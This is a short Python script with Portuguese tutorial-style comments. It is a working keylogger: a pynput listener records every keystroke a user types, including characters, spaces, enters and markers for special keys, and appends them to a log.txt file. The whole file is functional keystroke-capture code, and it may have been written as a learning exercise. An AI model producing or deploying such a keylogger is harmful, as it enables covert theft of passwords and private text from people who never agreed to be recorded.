from pynput import keyboard  # Biblioteca: pynput.keyboard # fornece objetos e listeners para capturar eventos do teclado.

IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}
def on_press(key):  # Abre o arquivo 'log.txt' em modo append (adiciona sem sobrescrever). 
    with open("log.txt", "a", encoding="utf-8") as f: # encoding="utf-8" garante que caracteres acentuados sejam gravados corretamente.
        try:
            f.write(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" [BACKSPACE] ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORAR:
                pass
            else:
                f.write(f"[{key}] ")

with keyboard.Listener(on_press=on_press) as listener:     # Mensagem informativa ao executar o arquivo direto.
    listener.join()
